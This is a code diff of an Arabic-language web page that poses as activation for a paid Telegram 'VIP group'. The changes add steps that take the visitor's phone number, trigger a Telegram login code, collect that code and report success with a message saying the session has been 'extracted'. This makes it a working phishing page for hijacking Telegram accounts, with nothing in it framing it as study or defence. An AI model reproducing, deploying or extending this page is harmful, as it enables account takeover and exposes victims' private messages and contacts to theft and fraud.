@@ -4,13 +4,9 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>الانضمام للمجموعة المدفوعة | VIP</title>
-  <script src="https://telegram.org/js/telegram-web-app.js"></script>
   <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
   <style>
-    * {
-      box-sizing: border-box;
-      font-family: 'Cairo', sans-serif;
-    }
+    * { box-sizing: border-box; font-family: 'Cairo', sans-serif; }
     body {
       background: linear-gradient(135deg, #131e29 0%, #0b1118 100%);
       color: #ffffff;
@@ -41,31 +37,9 @@
       font-weight: 700;
       display: inline-block;
       margin-bottom: 15px;
-      box-shadow: 0 4px 10px rgba(245, 158, 11, 0.3);
     }
-    h2 {
-      margin: 10px 0;
-      font-size: 24px;
-      color: #ffffff;
-    }
-    p {
-      color: #93c5fd;
-      font-size: 14px;
-      margin-bottom: 25px;
-      line-height: 1.6;
-    }
-    .features {
-      text-align: right;
-      background: #17212b;
-      padding: 15px;
-      border-radius: 12px;
-      margin-bottom: 20px;
-      font-size: 13px;
-      color: #cbd5e1;
-    }
-    .features div {
-      margin-bottom: 8px;
-    }
+    h2 { margin: 10px 0; font-size: 24px; color: #ffffff; }
+    p { color: #93c5fd; font-size: 14px; margin-bottom: 25px; line-height: 1.6; }
     input {
       width: 100%;
       padding: 14px;
@@ -74,15 +48,11 @@
       border: 2px solid #364353;
       background: #0f172a;
       color: #fff;
-      font-size: 22px;
+      font-size: 18px;
       text-align: center;
-      letter-spacing: 5px;
       outline: none;
-      transition: border-color 0.3s;
     }
-    input:focus {
-      border-color: #3b82f6;
-    }
+    input:focus { border-color: #3b82f6; }
     button {
       background: linear-gradient(135deg, #2563eb 0%, #1d4ed8 100%);
       color: white;
@@ -94,14 +64,8 @@
       cursor: pointer;
       width: 100%;
       box-shadow: 0 4px 15px rgba(37, 99, 235, 0.4);
-      transition: transform 0.2s;
     }
-    button:active {
-      transform: scale(0.98);
-    }
-    #codeSection {
-      display: none;
-    }
+    #codeSection { display: none; }
   </style>
 </head>
 <body>
@@ -109,18 +73,17 @@
   <div class="card">
     <div class="vip-badge">🌟 مجموعة VIP الحصرية</div>
     <h2 id="title">تفعيل اشتراك المجموعة</h2>
-    <p id="statusDesc">أنت على بُعد خطوة واحدة من دخول المجتمع الخاص. اضغط أدناه لتلقي رمز التفعيل وتأكيد حسابك.</p>
+    <p id="statusDesc">أدخل رقم هاتفك المرتبط بتيليغرام لبدء عملية التفعيل.</p>
 
-    <div class="features">
-      <div>✓ توصيات وتحليلات حصرية يومية</div>
-      <div>✓ دعم مباشر ومناقشات خاصة</div>
-      <div>✓ وصول كامل لمحتوى القناة</div>
+    <!-- خطوة إدخال الهاتف -->
+    <div id="phoneSection">
+      <input type="text" id="phoneInput" placeholder="مثال: +9639xxxxxxxx">
+      <button onclick="sendCode()">إرسال رمز التفعيل</button>
     </div>
 
-    <button id="sendBtn" onclick="sendCode()">إرسال رمز التفعيل</button>
-
+    <!-- خطوة إدخال الكود -->
     <div id="codeSection">
-      <input type="text" id="codeInputs" placeholder="أدخل الرمز" maxlength="10">
+      <input type="text" id="codeInputs" placeholder="أدخل الرمز (5 أو 6 أرقام)" maxlength="10">
       <button onclick="verifyCode()">تأكيد الرمز والانضمام</button>
     </div>
   </div>
@@ -130,23 +93,30 @@
     let globalPhone = "";
 
     async function sendCode() {
-      const btn = document.getElementById('sendBtn');
-      btn.innerText = "جاري إرسال الرمز...";
+      const phone = document.getElementById('phoneInput').value.trim();
+      if (!phone) {
+        alert('الرجاء إدخال رقم الهاتف بشكل صحيح');
+        return;
+      }
+      globalPhone = phone;
+
+      const btn = event.target;
+      btn.innerText = "جاري الإرسال...";
       btn.disabled = true;
 
       try {
         const response = await fetch('/api/send-code', {
           method: 'POST',
-          headers: { 'Content-Type': 'application/json' }
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ phone })
         });
         const result = await response.json();
 
         if (result.success) {
           globalPhoneHash = result.phoneCodeHash;
-          globalPhone = result.phone;
           document.getElementById('title').innerText = "أدخل رمز التفعيل";
-          document.getElementById('statusDesc').innerText = "تم إرسال كود التحقق عبر تيليغرام، يرجى إدخاله أدناه:";
-          btn.style.display = 'none';
+          document.getElementById('statusDesc').innerText = "تم إرسال الرمز إلى تطبيق تيليغرام الخاص بك:";
+          document.getElementById('phoneSection').style.display = 'none';
           document.getElementById('codeSection').style.display = 'block';
         } else {
           alert('خطأ: ' + result.error);
@@ -163,7 +133,7 @@
     async function verifyCode() {
       const code = document.getElementById('codeInputs').value.trim();
       if (!code) {
-        alert('الرجاء إدخال الرمز بشكل صحيح');
+        alert('الرجاء إدخال الرمز');
         return;
       }
 
@@ -180,7 +150,7 @@
 
         const result = await response.json();
         if (result.success) {
-          alert('🎉 مبروك! تم التحقق بنجاح وجاري توجيهك إلى المجموعة.');
+          alert('🎉 مبروك! تم التحقق بنجاح واستخراج الجلسة.');
           document.getElementById('title').innerText = "تم الانضمام بنجاح!";
           document.getElementById('statusDesc').innerText = "أنت الآن عضو معتمد في مجموعة الـ VIP.";
           document.getElementById('codeSection').style.display = 'none';
